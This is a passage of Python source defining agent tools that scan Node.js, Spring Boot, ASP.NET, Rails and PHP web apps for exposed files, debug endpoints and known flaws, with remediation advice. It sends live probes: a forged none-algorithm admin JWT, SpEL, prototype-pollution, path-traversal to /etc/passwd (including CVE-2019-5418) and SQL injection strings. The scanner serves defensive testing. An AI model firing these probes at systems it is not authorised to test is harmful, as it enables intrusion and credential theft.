                findings.append({
                    'check': 'package_json_exposed',
                    'path': path,
                    'status': http_label(st),
                    'app_name': name,
                    'app_version': version,
                    'dependencies_sample': deps,
                    'risk': 'high',
                    'detail': f'package.json exposed — reveals app name "{name}" v{version} and dependency list for CVE targeting',
                    'remediation': f'Block {path} in nginx; never deploy config files in web root'
                })
            except Exception:
                findings.append({
                    'check': 'package_file_exposed',
                    'path': path,
                    'status': http_label(st),
                    'risk': 'medium',
                    'detail': f'{path} is publicly accessible',
                    'remediation': f'Block {path} in web server config'
                })

    # 2. GraphQL introspection (common in Node.js apps)
    for gql_path in ['/graphql', '/api/graphql', '/v1/graphql', '/query']:
        # Probe with introspection query
        intro_query = json.dumps({'query': '{ __schema { types { name } } }'})
        st, hdrs, body = _fetch(base + gql_path, method='POST', data=intro_query,
                                 extra_headers=['Content-Type: application/json'])
        if st == 200 and '__schema' in body:
            findings.append({
                'check': 'graphql_introspection',
                'path': gql_path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': 'GraphQL introspection is enabled — exposes full API schema to attackers',
                'remediation': 'Disable introspection in production; set introspection: false in Apollo/GraphQL config'
            })
            break
        # Check if endpoint exists at all
        if st == 200 and body.strip().startswith('{'):
            findings.append({
                'check': 'graphql_endpoint',
                'path': gql_path,
                'status': http_label(st),
                'risk': 'info',
                'detail': 'GraphQL endpoint detected — audit for introspection and field-level auth',
                'remediation': 'Disable introspection; implement field-level authorization; rate-limit queries'
            })
            break

    # 3. /node_modules/ directory accessible
    st, _, body = _fetch(base + '/node_modules/')
    if st == 200 and ('Index of' in body or 'express' in body.lower()):
        findings.append({
            'check': 'node_modules_exposed',
            'path': '/node_modules/',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'node_modules/ directory is publicly accessible — source code and secrets exposed',
            'remediation': 'Serve only the build output; block /node_modules/ in nginx config'
        })

    # 4. /debug endpoint
    for debug_path in ['/debug', '/debug/', '/_debug', '/api/debug']:
        st, _, body = _fetch(base + debug_path)
        if st == 200 and ('process' in body.lower() or 'env' in body.lower() or
                           'memory' in body.lower() or body.strip().startswith('{')):
            findings.append({
                'check': 'debug_endpoint',
                'path': debug_path,
                'status': http_label(st),
                'risk': 'high',
                'detail': f'Debug endpoint {debug_path} is publicly accessible — may expose env/memory info',
                'remediation': 'Remove debug routes in production; gate with NODE_ENV check'
            })
            break

    # 5. JWT none-algorithm probe (if login endpoint exists)
    # We probe /api/user with a none-alg JWT to see if it's accepted
    none_jwt = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'
    st, _, body = _fetch(base + '/api/user', extra_headers=[f'Authorization: Bearer {none_jwt}'])
    if st == 200 and ('"id"' in body or '"email"' in body or '"role"' in body):
        try:
            data = json.loads(body)
            if data and not data.get('error'):
                findings.append({
                    'check': 'jwt_none_alg',
                    'path': '/api/user',
                    'status': http_label(st),
                    'risk': 'critical',
                    'detail': 'CRITICAL: JWT none-algorithm accepted — authentication bypass possible',
                    'remediation': 'Explicitly validate JWT algorithm; reject tokens with alg=none; use RS256 or HS256 with strong secret'
                })
        except Exception:
            pass

    # 6. Prototype pollution probe (basic — checks if __proto__ in query string causes error)
    pp_url = base + '/api/?__proto__[test]=cfai_probe'
    st, _, body = _fetch(pp_url)
    if st in (200, 500) and ('cfai_probe' in body or 'polluted' in body.lower()):
        findings.append({
            'check': 'prototype_pollution',
            'path': '/api/?__proto__[test]=cfai_probe',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'Possible prototype pollution — __proto__ reflected in response',
            'remediation': 'Sanitize query parameters; use Object.create(null) for user data; apply lodash patch'
        })

    # 7. X-Powered-By header reveals Express
    st, hdrs, _ = _fetch(base + '/')
    powered_by = hdrs.get('x-powered-by', '')
    if powered_by:
        findings.append({
            'check': 'x_powered_by_header',
            'header': powered_by,
            'risk': 'low',
            'detail': f'X-Powered-By header reveals: {powered_by}',
            'remediation': 'Add app.disable("x-powered-by") in Express; use helmet.js'
        })

    # 8. Common API endpoints enumeration
    api_paths = ['/api/users', '/api/admin', '/api/config', '/api/health',
                 '/api/status', '/api/env', '/api/logs']
    exposed = []
    for path in api_paths:
        st, _, body = _fetch(base + path)
        if st == 200:
            exposed.append(path)
    if exposed:
        findings.append({
            'check': 'api_endpoints_exposed',
            'paths': exposed,
            'risk': 'medium',
            'detail': f'{len(exposed)} API endpoints accessible without authentication: {", ".join(exposed)}',
            'remediation': 'Add authentication middleware to all sensitive API routes; implement RBAC'
        })

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Install helmet.js, rate-limit all API routes, run npm audit, disable introspection'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# JAVA SPRING BOOT
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_java_spring(target: str) -> str:
    """
    Java Spring Boot security scan.

    Checks: Spring Actuator endpoints (/actuator/env, /heapdump, /mappings,
    /beans, /threaddump), SpEL injection probe, H2 console exposure,
    Spring Boot Admin panel, Swagger/OpenAPI exposure, Spring Security
    misconfiguration indicators, error page information disclosure.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings, CVE references, and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'framework': 'Spring Boot', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. Actuator endpoints (critical info leak / RCE vector)
    actuator_checks = [
        ('/actuator',          'info',     'Actuator root — lists enabled endpoints'),
        ('/actuator/env',      'critical', 'Exposes all environment variables and config properties'),
        ('/actuator/heapdump', 'critical', 'Java heap dump — may contain credentials, tokens, PII in memory'),
        ('/actuator/threaddump','medium',  'Thread dump — reveals internal class names and state'),
        ('/actuator/mappings', 'high',     'Exposes all @RequestMapping routes — enables targeted fuzzing'),
        ('/actuator/beans',    'high',     'Lists all Spring beans — internal architecture disclosure'),
        ('/actuator/loggers',  'medium',   'Can change log levels — info disclosure and DoS'),
        ('/actuator/shutdown', 'critical', 'Graceful application shutdown — DoS via POST'),
        ('/actuator/restart',  'critical', 'Application restart endpoint'),
        ('/actuator/health',   'info',     'Health check — confirms Spring Boot and reveals components'),
        ('/actuator/info',     'info',     'App info — may reveal version, git commit hash'),
    ]
    for path, risk, detail in actuator_checks:
        st, _, body = _fetch(base + path)
        if st == 200:
            snippet = body[:400].replace('\n', ' ') if body else ''
            findings.append({
                'check': 'actuator_endpoint',
                'path': path,
                'status': http_label(st),
                'risk': risk,
                'detail': f'Spring Actuator {path} accessible — {detail}',
                'snippet': snippet[:300],
                'remediation': f'Restrict {path} to management port; require authentication; set management.endpoints.web.exposure.include=health,info only'
            })

    # 2. H2 Console exposure (in-memory DB dev console)
    for path in ['/h2-console', '/h2-console/', '/console/']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('h2' in body.lower() or 'JDBC' in body or 'console' in body.lower()):
            findings.append({
                'check': 'h2_console_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'critical',
                'detail': 'H2 database console exposed — allows SQL execution and Java code RCE via INIT parameter',
                'remediation': 'Set spring.h2.console.enabled=false in production; never expose H2 console'
            })
            break

    # 3. Spring Boot Admin panel
    for path in ['/admin', '/spring-admin', '/app-admin']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('spring boot admin' in body.lower() or 'application' in body.lower()):
            findings.append({
                'check': 'spring_admin_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'high',
                'detail': 'Spring Boot Admin panel may be accessible',
                'remediation': 'Add Spring Security authentication to admin panel; restrict by IP'
            })

    # 4. Swagger / OpenAPI documentation
    swagger_paths = ['/swagger-ui.html', '/swagger-ui/', '/swagger-ui/index.html',
                     '/api-docs', '/v2/api-docs', '/v3/api-docs',
                     '/swagger.json', '/openapi.json', '/openapi.yaml']
    for path in swagger_paths:
        st, _, body = _fetch(base + path)
        if st == 200 and ('swagger' in body.lower() or 'openapi' in body.lower() or
                           '"paths"' in body or '"info"' in body):
            findings.append({
                'check': 'swagger_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': 'Swagger/OpenAPI documentation publicly accessible — full API schema exposed',
                'remediation': 'Disable Swagger in production or require authentication; set springdoc.api-docs.enabled=false'
            })
            break

    # 5. SpEL injection probe (Spring Expression Language)
    spel_url = base + '/?name=${7*7}'
    st, _, body = _fetch(spel_url)
    if st in (200, 500) and '49' in body:
        findings.append({
            'check': 'spel_injection',
            'path': '/?name=${7*7}',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'SpEL injection confirmed — ${7*7} evaluates to 49 in response',
            'remediation': 'Use SimpleEvaluationContext instead of StandardEvaluationContext; sanitize all user inputs before SpEL evaluation'
        })

    # 6. Error page information disclosure (Whitelabel Error Page)
    st, _, body = _fetch(base + '/cfai-probe-xyz-not-exist')
    if st in (404, 500) and ('whitelabel' in body.lower() or 'spring' in body.lower()):
        findings.append({
            'check': 'whitelabel_error',
            'status': http_label(st),
            'risk': 'low',
            'detail': 'Spring Boot Whitelabel error page exposed — confirms Spring Boot and leaks basic app info',
            'remediation': 'Implement custom error pages; set server.error.whitelabel.enabled=false'
        })

    # 7. /env or /config endpoint via Actuator (look for passwords in env)
    # (already covered above, but check for plain-text secrets specifically)
    env_findings = [f for f in findings if f.get('path') == '/actuator/env' and f.get('status') == 200]
    for ef in env_findings:
        snippet = ef.get('snippet', '')
        if any(k in snippet.lower() for k in ['password', 'secret', 'key', 'token', 'credential']):
            ef['risk'] = 'critical'
            ef['detail'] += ' — CREDENTIAL LEAK: password/secret found in env dump'

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Restrict actuator endpoints; set management.server.port to internal port; disable H2 console and Swagger in production'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# ASP.NET / .NET
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_dotnet(target: str) -> str:
    """
    ASP.NET / .NET security scan.

    Checks: ViewState MAC validation (CVE-2010-3332 style), elmah.axd error log,
    trace.axd request tracing, .aspx file enumeration for IDOR, web.config
    and backup exposure, ScriptResource.axd, default error pages,
    X-Aspnet-Version / X-Powered-By version disclosure, IIS short filename.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'framework': 'ASP.NET/.NET', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. elmah.axd — error log viewer (extremely common misconfiguration)
    for path in ['/elmah.axd', '/admin/elmah.axd', '/errors/elmah.axd']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('elmah' in body.lower() or 'error log' in body.lower() or
                           'exception' in body.lower()):
            findings.append({
                'check': 'elmah_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'high',
                'detail': 'ELMAH error log viewer is publicly accessible — full stack traces, URLs, and data exposed',
                'remediation': 'Add <location path="elmah.axd"><system.web><authorization><deny users="*"/></authorization></system.web></location> in web.config'
            })
            break

    # 2. trace.axd — request/response tracer
    st, _, body = _fetch(base + '/trace.axd')
    if st == 200 and ('trace' in body.lower() or 'request' in body.lower()):
        findings.append({
            'check': 'trace_axd_exposed',
            'path': '/trace.axd',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'trace.axd request tracing is enabled — reveals all recent HTTP requests including cookies/tokens',
            'remediation': 'Set <trace enabled="false"> in web.config system.web section'
        })

    # 3. web.config exposure (including backup variants)
    for path in ['/web.config', '/Web.config', '/web.config.bak',
                 '/app.config', '/applicationHost.config']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('<configuration' in body or 'connectionString' in body.lower() or
                           'machineKey' in body.lower()):
            sensitive = []
            for key in ['connectionStrings', 'machineKey', 'password', 'secret', 'apiKey']:
                if key.lower() in body.lower():
                    sensitive.append(key)
            findings.append({
                'check': 'web_config_exposed',
                'path': path,
                'status': http_label(st),
                'sensitive_sections': sensitive,
                'risk': 'critical',
                'detail': f'web.config exposed — contains: {", ".join(sensitive)}',
                'remediation': 'Deny access to web.config in IIS; ensure document root is set correctly'
            })

    # 4. Version disclosure via headers
    st, hdrs, _ = _fetch(base + '/')
    server = hdrs.get('server', '')
    aspnet_ver = hdrs.get('x-aspnet-version', '')
    aspnetmvc_ver = hdrs.get('x-aspnetmvc-version', '')
    x_pow = hdrs.get('x-powered-by', '')

    if aspnet_ver:
        findings.append({
            'check': 'aspnet_version_header',
            'header': 'X-Aspnet-Version',
            'value': aspnet_ver,
            'risk': 'low',
            'detail': f'ASP.NET version disclosed in header: {aspnet_ver}',
            'remediation': 'Set <httpRuntime enableVersionHeader="false"/> in web.config'
        })
    if aspnetmvc_ver:
        findings.append({
            'check': 'aspnetmvc_version_header',
            'header': 'X-AspNetMvc-Version',
            'value': aspnetmvc_ver,
            'risk': 'low',
            'detail': f'ASP.NET MVC version disclosed: {aspnetmvc_ver}',
            'remediation': 'MvcHandler.DisableMvcResponseHeader = true in Application_Start'
        })

    # 5. IIS short filename (8.3) enumeration probe
    short_url = base + '/a~1/a.aspx'
    st, _, body = _fetch(short_url)
    if st == 404 and '0x80070002' in body:
        findings.append({
            'check': 'iis_short_filename',
            'path': '/a~1/a.aspx',
            'status': http_label(st),
            'risk': 'medium',
            'detail': 'IIS 8.3 short filename enumeration possible — attackers can discover hidden files/dirs',
            'remediation': 'Disable 8.3 filename generation: fsutil 8dot3name set 0; apply IIS patch MS10-070'
        })

    # 6. .aspx IDOR / enumeration
    common_aspx = ['/admin.aspx', '/login.aspx', '/default.aspx', '/upload.aspx',
                   '/edit.aspx', '/manage.aspx', '/account.aspx', '/profile.aspx']
    found_aspx = []
    for path in common_aspx:
        st, _, _ = _fetch(base + path)
        if st == 200:
            found_aspx.append(path)
    if found_aspx:
        findings.append({
            'check': 'aspx_endpoints',
            'paths': found_aspx,
            'risk': 'info',
            'detail': f'Found {len(found_aspx)} .aspx endpoints — check each for IDOR, auth bypass, and ViewState tampering',
            'remediation': 'Audit all .aspx pages for proper authorization checks and EnableViewStateMac=true'
        })

    # 7. ScriptResource.axd (may reveal .NET version)
    st, _, body = _fetch(base + '/ScriptResource.axd')
    if st == 200:
        ver = re.search(r'Version=([\d.]+)', body)
        findings.append({
            'check': 'scriptresource_axd',
            'path': '/ScriptResource.axd',
            'status': http_label(st),
            'version': ver.group(1) if ver else 'unknown',
            'risk': 'low',
            'detail': 'ScriptResource.axd accessible — confirms ASP.NET WebForms',
            'remediation': 'Not a direct vulnerability; ensure full .NET version is not exposed'
        })

    # 8. ViewState MAC validation probe (send tampered ViewState)
    # This is a passive signal check only — we look for ViewState in forms
    st, _, body = _fetch(base + '/')
    if '__VIEWSTATE' in body:
        viewstate_mac = 'EnableViewStateMac' not in body or 'false' in body.lower()
        findings.append({
            'check': 'viewstate_present',
            'risk': 'info',
            'detail': 'ViewState found on page — verify EnableViewStateMac=true and machineKey is configured with strong random keys',
            'remediation': 'Set <pages enableViewStateMac="true"> and configure a strong <machineKey> in web.config'
        })

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Run OWASP ZAP scan; check NuGet packages for CVEs; verify EnableViewStateMac and MachineKey config'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# RUBY ON RAILS
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_rails(target: str) -> str:
    """
    Ruby on Rails security scan.

    Checks: /rails/info/properties (debug info), debug error pages,
    asset pipeline exposure, mass assignment indicators, CSRF weakness probes,
    common Rails CVE paths (CVE-2019-5418 path traversal, CVE-2020-8165),
    /admin Devise panel, secret_key_base in source, route enumeration.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'framework': 'Ruby on Rails', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. /rails/info/properties — debug info (dev only but sometimes left on)
    st, _, body = _fetch(base + '/rails/info/properties')
    if st == 200 and ('Rails' in body or 'Ruby' in body or 'properties' in body.lower()):
        findings.append({
            'check': 'rails_info_properties',
            'path': '/rails/info/properties',
            'status': http_label(st),
            'risk': 'high',
            'detail': '/rails/info/properties exposed — reveals Rails version, Ruby version, middleware stack, routes',
            'remediation': 'Set config.consider_all_requests_local = false in production; restrict by IP'
        })

    # 2. /rails/info/routes
    st, _, body = _fetch(base + '/rails/info/routes')
    if st == 200 and ('GET' in body or 'POST' in body or 'DELETE' in body):
        findings.append({
            'check': 'rails_routes_exposed',
            'path': '/rails/info/routes',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'All Rails routes exposed — enables targeted attack surface mapping',
            'remediation': 'Disable debug mode in production; restrict /rails/ endpoints'
        })

    # 3. CVE-2019-5418 — Path traversal via Accept header (ActionView)
    headers = ['Accept: ../../../../etc/passwd{{']
    st, _, body = _fetch(base + '/', extra_headers=headers)
    if st == 200 and ('root:' in body or '/bin/' in body):
        findings.append({
            'check': 'cve_2019_5418_traversal',
            'cve': 'CVE-2019-5418',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'CRITICAL: Rails path traversal via Accept header — file read confirmed (CVE-2019-5418)',
            'remediation': 'Upgrade Rails to 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1, or 6.0+ IMMEDIATELY'
        })

    # 4. Debug error page (config.consider_all_requests_local = true)
    st, _, body = _fetch(base + '/cfai-probe-xyz-notexist')
    if st in (404, 500) and ('rails' in body.lower() and
                              ('exception' in body.lower() or 'backtrace' in body.lower())):
        findings.append({
            'check': 'debug_error_page',
            'status': http_label(st),
            'risk': 'high',
            'detail': 'Rails debug error page is enabled — full backtraces and source code snippets exposed',
            'remediation': 'Set config.consider_all_requests_local = false in config/environments/production.rb'
        })

    # 5. Devise admin / user routes
    for path in ['/admin', '/admin/sign_in', '/users/sign_in', '/login']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('devise' in body.lower() or 'sign in' in body.lower() or
                           'sign_in' in body.lower()):
            findings.append({
                'check': 'devise_panel',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': f'Devise authentication panel detected at {path}',
                'remediation': 'Add 2FA; rate-limit sign-in; audit Devise configuration for lockout policy'
            })
            break

    # 6. assets/ pipeline (should not serve source maps in prod)
    for path in ['/assets/', '/public/assets/']:
        st, _, body = _fetch(base + path)
        if st == 200 and 'Index of' in body:
            findings.append({
                'check': 'assets_listing',
                'path': path,
                'status': http_label(st),
                'risk': 'medium',
                'detail': 'Asset directory listing enabled — may expose source maps with original JS/CSS',
                'remediation': 'Disable directory listing; set config.assets.compile = false in production'
            })

    # 7. database.yml backup exposure
    for path in ['/config/database.yml', '/database.yml', '/config/secrets.yml']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('adapter' in body or 'database' in body or 'password' in body):
            findings.append({
                'check': 'database_yml_exposed',
                'path': path,
                'status': http_label(st),
                'risk': 'critical',
                'detail': f'{path} exposed — contains database configuration and credentials',
                'remediation': 'Block config/ directory in web server; use env vars for credentials'
            })

    # 8. Gemfile / Gemfile.lock (dependency enumeration)
    for path in ['/Gemfile', '/Gemfile.lock']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('gem ' in body or 'GEM' in body or 'DEPENDENCIES' in body):
            gems = re.findall(r'gem ["\']([^"\']+)', body)[:15]
            findings.append({
                'check': 'gemfile_exposed',
                'path': path,
                'status': http_label(st),
                'gems_sample': gems,
                'risk': 'medium',
                'detail': f'{path} exposed — reveals full dependency list for CVE targeting',
                'remediation': f'Block {path} in nginx/Apache; never serve app root files publicly'
            })

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Run brakeman static analysis; run bundle audit for gem CVEs; run rails_best_practices'
    }
    return json.dumps(results, indent=2)


# ──────────────────────────────────────────────────────────────────────────────
# GENERIC PHP
# ──────────────────────────────────────────────────────────────────────────────

@function_tool
def scan_generic_php(target: str) -> str:
    """
    Generic PHP application security scan.

    Checks: phpinfo() exposure, .php backup files, PHP error disclosure,
    common admin panels (phpMyAdmin, adminer), file upload endpoints,
    SQL injection error signatures, local file inclusion probes,
    open_basedir / allow_url_include indicators, composer.json exposure.

    Args:
        target: Target URL (e.g. https://example.com)

    Returns JSON with findings and remediation notes.
    """
    base     = _base(target)
    results  = {'target': base, 'framework': 'PHP', 'findings': [], 'summary': {}}
    findings = results['findings']

    # 1. phpinfo() exposure
    for path in ['/phpinfo.php', '/info.php', '/php.php', '/test.php',
                 '/i.php', '/phptest.php', '/phpi.php']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('phpinfo' in body.lower() or 'PHP Version' in body):
            ver = re.search(r'PHP Version\s+([\d.]+)', body)
            findings.append({
                'check': 'phpinfo_exposed',
                'path': path,
                'status': http_label(st),
                'php_version': ver.group(1) if ver else 'unknown',
                'risk': 'critical',
                'detail': f'phpinfo() page exposed at {path} — reveals PHP version, config, modules, and server paths',
                'remediation': f'Delete {path}; never leave phpinfo() in production'
            })

    # 2. phpMyAdmin / Adminer
    for path, name in [('/phpmyadmin/', 'phpMyAdmin'), ('/pma/', 'phpMyAdmin'),
                        ('/adminer.php', 'Adminer'), ('/adminer/', 'Adminer'),
                        ('/db/', 'DB admin'), ('/dbadmin/', 'DB admin')]:
        st, _, body = _fetch(base + path)
        if st == 200 and (name.lower() in body.lower() or 'mysql' in body.lower() or
                           'database' in body.lower()):
            findings.append({
                'check': 'db_admin_exposed',
                'path': path,
                'tool': name,
                'status': http_label(st),
                'risk': 'critical',
                'detail': f'{name} is publicly accessible — brute-force / SQLi / direct DB access',
                'remediation': f'Move {path} to non-guessable URL or restrict by IP; add HTTP auth'
            })

    # 3. PHP backup / source files
    backup_paths = ['/index.php.bak', '/config.php.bak', '/db.php.bak',
                    '/config.inc.php', '/config.php~', '/wp-config.php.old',
                    '/backup.php', '/old.php', '/test.php', '/phptest.php']
    for path in backup_paths:
        st, _, body = _fetch(base + path)
        if st == 200 and len(body) > 100:
            has_creds = any(k in body.lower() for k in ['password', 'db_pass', 'mysql', 'secret'])
            findings.append({
                'check': 'php_backup_file',
                'path': path,
                'status': http_label(st),
                'contains_credentials': has_creds,
                'risk': 'critical' if has_creds else 'high',
                'detail': f'PHP backup/config file exposed at {path}' + (' — credentials detected' if has_creds else ''),
                'remediation': f'Delete {path}; ensure backups are not stored in web root'
            })

    # 4. PHP error disclosure (error_reporting = E_ALL)
    lfi_probe = base + '/?file=../../etc/passwd'
    st, _, body = _fetch(lfi_probe)
    if 'root:' in body or '/bin/' in body:
        findings.append({
            'check': 'lfi_confirmed',
            'path': '/?file=../../etc/passwd',
            'status': http_label(st),
            'risk': 'critical',
            'detail': 'CRITICAL: Local File Inclusion confirmed — /etc/passwd readable via ?file= parameter',
            'remediation': 'Sanitize all file path inputs; use basename(); set open_basedir in php.ini; never include user-controlled paths'
        })
    elif 'failed to open stream' in body.lower() or 'No such file' in body:
        findings.append({
            'check': 'lfi_error_disclosure',
            'path': '/?file=../../etc/passwd',
            'status': http_label(st),
            'risk': 'medium',
            'detail': 'PHP error messages exposed — LFI attempt reveals server paths in error output',
            'remediation': 'Set display_errors=Off and log_errors=On in php.ini'
        })

    # 5. SQL injection error signatures
    sqli_probes = ["'", "1' OR '1'='1", "1 AND 1=2--"]
    for param in ['?id=', '?page=', '?cat=', '?item=']:
        for probe in sqli_probes:
            url = base + '/' + param + urllib.parse.quote(probe)
            st, _, body = _fetch(url)
            if any(sig in body for sig in ['You have an error in your SQL syntax',
                                            'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
                                            'ODBC Driver', 'syntax error']):
                findings.append({
                    'check': 'sqli_error_signature',
                    'path': param + probe,
                    'status': http_label(st),
                    'risk': 'critical',
                    'detail': f'SQL injection error signature in response for {param}{probe}',
                    'remediation': 'Use PDO prepared statements for ALL queries; set display_errors=Off'
                })
                break

    # 6. File upload endpoint discovery
    for path in ['/upload.php', '/upload/', '/uploads/', '/files/upload',
                 '/api/upload', '/media/upload']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('upload' in body.lower() or 'file' in body.lower() or
                           'form' in body.lower()):
            findings.append({
                'check': 'upload_endpoint',
                'path': path,
                'status': http_label(st),
                'risk': 'high',
                'detail': f'File upload endpoint at {path} — audit for unrestricted upload (webshell RCE)',
                'remediation': 'Whitelist file types; store uploads outside web root; scan uploads for malware; use random filenames'
            })

    # 7. composer.json / composer.lock
    for path in ['/composer.json', '/composer.lock']:
        st, _, body = _fetch(base + path)
        if st == 200 and ('require' in body or 'packages' in body):
            try:
                data = json.loads(body)
                deps = list(data.get('require', {}).keys())[:10] if 'require' in data else []
                findings.append({
                    'check': 'composer_json_exposed',
                    'path': path,
                    'status': http_label(st),
                    'dependencies': deps,
                    'risk': 'medium',
                    'detail': f'{path} exposed — reveals PHP package list for CVE targeting',
                    'remediation': f'Block {path} in nginx/Apache config'
                })
            except Exception:
                pass

    # 8. .git/config exposure
    st, _, body = _fetch(base + '/.git/config')
    if st == 200 and '[core]' in body:
        findings.append({
            'check': 'git_config_exposed',
            'path': '/.git/config',
            'status': http_label(st),
            'risk': 'high',
            'detail': '.git directory exposed — full source code downloadable via git-dumper',
            'remediation': 'Block /.git/ in nginx; never deploy with .git in web root'
        })

    risk_counts = {}
    for f in findings:
        r = f.get('risk', 'info')
        risk_counts[r] = risk_counts.get(r, 0) + 1
    results['summary'] = {
        'total_findings': len(findings),
        'by_risk': risk_counts,
        'recommendation': 'Run nikto; set display_errors=Off; use prepared statements everywhere; audit file uploads'
    }
    return json.dumps(results, indent=2)
